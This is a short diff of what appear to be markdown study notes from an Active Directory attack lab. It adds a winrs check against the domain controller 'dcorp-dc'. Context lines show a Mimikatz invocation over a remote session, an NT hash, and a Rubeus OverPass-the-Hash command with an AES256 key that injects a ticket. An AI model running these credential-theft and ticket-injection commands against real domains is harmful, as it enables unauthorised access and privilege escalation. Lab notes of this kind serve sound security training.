@@ -241,7 +241,13 @@ Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 | rc4_hmac_nt | b38ff50264b74508085d82c69794a4d8                                 |
 
 Finally we can use the OverPass-the-Hash technique to access on dcorp-dc
-```powershell
+```cmd
 Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 ==With cmd and elevated priviledges==
+Use winrs to test
+```powershell
+winrs -r:dcorp-dc whoami
+```
+![[Pasted image 20231019111546.png]]
+
